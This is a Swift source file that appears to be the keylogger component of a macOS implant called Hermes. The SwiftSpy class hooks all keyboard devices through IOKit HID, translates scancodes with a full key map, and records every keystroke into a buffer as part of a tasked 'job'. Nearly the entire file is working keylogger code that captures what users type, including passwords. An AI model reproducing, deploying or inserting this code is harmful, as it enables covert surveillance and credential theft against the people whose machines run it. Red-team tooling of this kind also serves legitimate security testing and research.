//
//  keylog.swift
//  Hermes
//
//  Created by Justin Bui on 7/12/21.
//

import Foundation
import IOKit.hid

var keyMap: [UInt32:[String]]
{
    var map = [UInt32:[String]]()
    map[4] = ["a","A"]
    map[5] = ["b","B"]
    map[6] = ["c","C"]
    map[7] = ["d","D"]
    map[8] = ["e","E"]
    map[9] = ["f","F"]
    map[10] = ["g","G"]
    map[11] = ["h","H"]
    map[12] = ["i","I"]
    map[13] = ["j","J"]
    map[14] = ["k","K"]
    map[15] = ["l","L"]
    map[16] = ["m","M"]
    map[17] = ["n","N"]
    map[18] = ["o","O"]
    map[19] = ["p","P"]
    map[20] = ["q","Q"]
    map[21] = ["r","R"]
    map[22] = ["s","S"]
    map[23] = ["t","T"]
    map[24] = ["u","U"]
    map[25] = ["v","V"]
    map[26] = ["w","W"]
    map[27] = ["x","X"]
    map[28] = ["y","Y"]
    map[29] = ["z","Z"]
    map[30] = ["1","!"]
    map[31] = ["2","@"]
    map[32] = ["3","#"]
    map[33] = ["4","$"]
    map[34] = ["5","%"]
    map[35] = ["6","^"]
    map[36] = ["7","&"]
    map[37] = ["8","*"]
    map[38] = ["9","("]
    map[39] = ["0",")"]
    map[40] = ["\n","\n"]
    map[41] = ["[ESCAPE]","[ESCAPE]"]
    map[42] = ["[DELETE|BACKSPACE]","[DELETE|BACKSPACE]"] //
    map[43] = ["[TAB]","[TAB]"]
    map[44] = [" "," "]
    map[45] = ["-","_"]
    map[46] = ["=","+"]
    map[47] = ["[","{"]
    map[48] = ["]","}"]
    map[49] = ["\\","|"]
    map[50] = ["",""] // Keyboard Non-US# and ~2
    map[51] = [";",":"]
    map[52] = ["'","\""]
    map[53] = ["`","~"]
    map[54] = [",","<"]
    map[55] = [".",">"]
    map[56] = ["/","?"]
    map[57] = ["[CAPSLOCK]","[CAPSLOCK]"]
    map[58] = ["[F1]","[F1]"]
    map[59] = ["[F2]","[F2]"]
    map[60] = ["[F3]","[F3]"]
    map[61] = ["[F4]","[F4]"]
    map[62] = ["[F5]","[F5]"]
    map[63] = ["[F6]","[F6]"]
    map[64] = ["[F7]","[F7]"]
    map[65] = ["[F8]","[F8]"]
    map[66] = ["[F9]","[F9]"]
    map[67] = ["[F10]","[F10]"]
    map[68] = ["[F11]","[F11]"]
    map[69] = ["[F12]","[F12]"]
    map[70] = ["[PRINTSCREEN]","[PRINTSCREEN]"]
    map[71] = ["[SCROLL-LOCK]","[SCROLL-LOCK]"]
    map[72] = ["[PAUSE]","[PAUSE]"]
    map[73] = ["[INSERT]","[INSERT]"]
    map[74] = ["[HOME]","[HOME]"]
    map[75] = ["[PAGEUP]","[PAGEUP]"]
    map[76] = ["[DELETE-FORWARD]","[DELETE-FORWARD]"] //
    map[77] = ["[END]","[END]"]
    map[78] = ["[PAGEDOWN]","[PAGEDOWN]"]
    map[79] = ["[RIGHTARROW]","[RIGHTARROW]"]
    map[80] = ["[LEFTARROW]","[LEFTARROW]"]
    map[81] = ["[DOWNARROW]","[DOWNARROW]"]
    map[82] = ["[UPARROW]","[UPARROW]"]
    map[83] = ["[NUMLOCK]","[CLEAR]"]
    // Keypads
    map[84] = ["/","/"]
    map[85] = ["*","*"]
    map[86] = ["-","-"]
    map[87] = ["+","+"]
    map[88] = ["[ENTER]","[ENTER]"]
    map[89] = ["1","[END]"]
    map[90] = ["2","[DOWNARROW]"]
    map[91] = ["3","[PAGEDOWN]"]
    map[92] = ["4","[LEFTARROW]"]
    map[93] = ["5","5"]
    map[94] = ["6","[RIGHTARROW]"]
    map[95] = ["7","[HOME]"]
    map[96] = ["8","[UPARROW]"]
    map[97] = ["9","[PAGEUP]"]
    map[98] = ["0","[INSERT]"]
    map[99] = [".","[DELETE]"]
    map[100] = ["",""] //
    /////
    map[224] = ["[LCTRL]","[LCTRL]"] // left control
    map[225] = ["[LSHIFT_PRESS]","[SHIFT_RELEASE]"] // left shift
    map[226] = ["[LALT]","[LALT]"] // left alt
    map[227] = ["[LCMD]","[LCMD]"] // left cmd
    map[228] = ["[RCTRL]","[RCTRL]"] // right control
    map[229] = ["[RSHIFT_PRESS]","[SHIFT_RELEASE]"] // right shift
    map[230] = ["[RALT]","[RALT]"] // right alt
    map[231] = ["[RCMD]","[RCMD]"] // right cmd
    return map
}

class SwiftSpy {
    // https://stackoverflow.com/questions/8676135/osx-hid-filter-for-secondary-keyboard
    // https://developer.apple.com/library/archive/documentation/DeviceDrivers/Conceptual/HID/new_api_10_5/tn2187.html
    // https://stackoverflow.com/questions/48070396/how-to-get-list-of-hid-devices-in-a-swift-cocoa-application
    func keylog(job: Job) {
        
        job.status = "keylog_started"
        
        // Create HID Manager
        let HIDManager = IOHIDManagerCreate(kCFAllocatorDefault, 0)
        if (CFGetTypeID(HIDManager) != IOHIDManagerGetTypeID())
        {
            job.result = "Exception caught: Could not create HID manager"
            job.completed = true
            job.success = false
            job.status = "error"
            return
        }
        
        // Setup device filtering,
        func CreateDeviceMatchingDictionary( usagePage: Int, usage: Int) -> CFMutableDictionary {
            let dict = [
                kIOHIDDeviceUsageKey: usage,
                kIOHIDDeviceUsagePageKey: usagePage
            ] as NSDictionary
            
            return dict.mutableCopy() as! NSMutableDictionary;
        }
        let keyboard = CreateDeviceMatchingDictionary(usagePage: kHIDPage_GenericDesktop, usage: kHIDUsage_GD_Keyboard)
        IOHIDManagerSetDeviceMatching(HIDManager, keyboard)
        
        // Enumerate keyboard devices
        let devices = IOHIDManagerCopyDevices(HIDManager)
        if (devices == nil) {
            job.result = "Exception caught: Could not find any devices"
            job.completed = true
            job.success = false
            job.status = "error"
            return
        }
        
        // Setup callback
        let context = UnsafeMutableRawPointer(Unmanaged.passUnretained(self).toOpaque())
        // https://stackoverflow.com/questions/7190852/using-iohidmanager-to-get-modifier-key-events
        // https://stackoverflow.com/questions/30380400/how-to-tap-hook-keyboard-events-in-osx-and-record-which-keyboard-fires-each-even
        let Handle_IOHIDInputValueCallback: IOHIDValueCallback = { context, result, sender, value in
            print("KEY_RECEIVED")
            let elem: IOHIDElement = IOHIDValueGetElement(value);
            let scancode = IOHIDElementGetUsage(elem);
            if (IOHIDElementGetUsagePage(elem) != 0x07)
            {
                return
            }
            
            // invalid keys
            if (scancode < 4 || scancode > 231)
            {
                return;
            }
            
            // returns 1 when a key was pressed and 0 when a key is released
            let pressed = IOHIDValueGetIntegerValue(value);
            if (pressed == 1)
            {
                // modifying caplocks variable and return
                if (scancode == 57)
                {
                    capslock = !capslock
                    keylogBuffer += keyMap[scancode]![0]
                    return
                }
                
                // print shift up and return
                if (scancode == 225 || scancode == 229)
                {
                    keylogBuffer += keyMap[scancode]![0]
                    return
                }
                
                // no capslock
                if (capslock == false)
                {
                    keylogBuffer += keyMap[scancode]![0]
                }
                // capslock on
                else if (capslock == true)
                {
                    // only capitalize letters
                    if (scancode >= 4 && scancode <= 29)
                    {
                        keylogBuffer += keyMap[scancode]![1]
                    }
                    else
                    {
                        keylogBuffer += keyMap[scancode]![0]
                    }
                }
            }
            else if((pressed == 0) && (scancode == 225 || scancode == 229))
            {
                keylogBuffer += keyMap[scancode]![1]
            }
        }
        IOHIDManagerRegisterInputValueCallback(HIDManager, Handle_IOHIDInputValueCallback, context);
        
        // Open HID Manager
        let ioreturn: IOReturn = IOHIDManagerOpen(HIDManager, IOOptionBits(kIOHIDOptionsTypeNone) )
        if ioreturn != kIOReturnSuccess
        {
            job.result = "Exception caught: Could not open HID manager"
            job.completed = true
            job.success = false
            job.status = "error"
            return
        }
        
        // Start RunLoop
        IOHIDManagerScheduleWithRunLoop(HIDManager, CFRunLoopGetCurrent(), CFRunLoopMode.defaultMode.rawValue)
        print("START_RUNLOOP")
        RunLoop.current.run()
        print("RUNLOOP_STARTED")
    }
}
